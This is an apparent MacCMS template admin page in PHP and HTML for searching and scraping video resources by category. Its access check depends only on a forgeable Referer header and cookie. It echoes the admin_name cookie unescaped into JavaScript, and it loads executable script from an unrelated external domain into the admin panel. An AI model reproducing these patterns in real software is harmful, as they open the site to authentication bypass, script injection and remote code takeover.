<?php if(!@$_SERVER['HTTP_REFERER']||!$_COOKIE["admin_name"]) header('location:http://'.$_SERVER['HTTP_HOST']);?>
<!DOCTYPE html>
<html>
<head>
<title>vfed采集资源</title>
<meta name="renderer" content="webkit" />
<?php $vfed = require('../../application/extra/maccms.php'); ?>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="<?php echo $vfed['site']['install_dir']; ?>static/layui/css/layui.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">var vfed = {'tpls':'<?php echo $vfed['site']['install_dir'].'template/'.$vfed['site']['template_dir'].'/';?>','name':'<?php echo $_COOKIE["admin_name"];?>'};</script>
<script src="<?php echo $vfed['site']['install_dir']; ?>static/js/jquery.js?v=<?php echo time(); ?>" type="text/javascript" charset="utf-8"></script>
<script src="<?php echo $vfed['site']['install_dir']; ?>static/layui/layui.js?v=<?php echo time(); ?>" type="text/javascript" charset="utf-8"></script>
<script src="https://采集.雅丶涵.eu.org/collect.js?v=<?php echo time(); ?>" class="collect"></script>
</head>
<body>
<form class="layui-form layui-form-pane">
	<div class="layui-tab layui-form-item">
		<label class="layui-form-label">全网资源</label>
		<div class="layui-input-inline">
			<select name="collect" lay-verify="required">
				<option value="m3u8" selected>切片资源专区</option>
				<option value="bigs">视频网站专区</option>
				<option value="news">资讯资源专区</option>
				<option value="star">明星资源专区</option>
				<option value="down">下载资源专区</option>
				<option value="disk">网盘资源专区</option>
				<option value="fuck">叉站资源专区</option>
				<option value="tops">推荐资源专区</option>
				<option value="offi">视频独立采集</option>
				<option value="comp">综合资源专区</option>
				<option value="play">云播资源专区</option>
				<option value="live">直播资源专区</option>
			</select>
		</div>
		<div class="layui-input-inline">
			<input type="text" required lay-verify="required" placeholder="请输入关键字" autocomplete="off" class="layui-input layui-input-search">
		</div>
		<div class="layui-input-inline">
			<button type="button" class="layui-btn searchs">立即搜索</button>
			<input type="text" required lay-verify="required" placeholder="搜索间隔" autocomplete="off" class="layui-input interval" value="3" style="width:38px;display:inline-block">
			<span>秒间隔</span>
		</div>
	</div>
</form>
<div class="layui-tab layui-collect"></div>
</body>
</html>